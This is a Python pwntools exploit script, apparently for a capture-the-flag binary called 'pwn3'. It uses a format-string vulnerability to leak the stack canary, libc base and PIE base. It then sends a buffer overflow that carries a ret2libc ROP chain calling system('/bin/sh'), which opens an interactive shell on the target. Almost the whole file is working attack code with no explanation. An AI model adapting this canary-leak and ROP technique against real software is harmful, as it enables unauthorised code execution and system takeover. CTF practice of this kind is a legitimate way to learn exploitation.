from pwn import *


def fuzz(pwd=""):
    
    for i in range(45):
        p = process("./pwn3",level="error")

        p.recvline()
        p.sendline(flag)
        p.recvline("name:")
        p.sendline("AAAA %{}$lp".format(i))
        print(str(i) + " - " + p.recvuntil("spell:")[-46:-22])
        p.close()


libc_offset = 0x1eb723
pie_offset = 0x1570 
ret_offset = 0x1525
main_offset = 0x1526

pop_rdi_offset = 0x015d3

binsh_offset = 0x1b6613
system_offset = 0x554e0
exit_offset = 0xe5fb0

flag = "SCG{NOW_GET_VOLDEMORT}"
leak = "AAAA %1$1lp %39$lp %44$lp BBBB"
spell = "Expelliarmus\x00"
pad = cyclic(0xff+0xf)


#p = remote("hax1.allesctf.net",9102)
p = process("./pwn3")

print(p.recvline())
p.sendline(flag)
print(p.recvuntil("name:"))
p.sendline(leak)
tmp = p.recvuntil("spell:")

print(tmp)

canary = int(tmp.split()[-7],16)
libc_base = int(tmp.split()[-8],16) - libc_offset
system = libc_base + system_offset
bin_sh = libc_base + binsh_offset
exit = libc_base + exit_offset
pie_base = int(tmp.split()[-6],16) - pie_offset
ret = pie_base + ret_offset
pop_rdi = pie_base + pop_rdi_offset
RBP = "BBBBBBBB"

log.info("Stack Canary: {}".format(hex(canary)))
log.info("PIE base addr: {}".format(hex(pie_base)))
log.info("LibC base addr: {}".format(hex(libc_base)))
log.info("system addr: {}".format(hex(system)))
log.info("/bin/sh addr: {}".format(hex(bin_sh)))
log.info("exit addr: {}".format(hex(exit)))
log.info("AAAAAAAA_ret operation: {}".format(hex(ret)))

raw_input("Exploit ?")
idx = cyclic_find("cnaacoaa")
p.sendline(spell+pad[:idx]+p64(canary)+RBP+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system))
p.interactive()
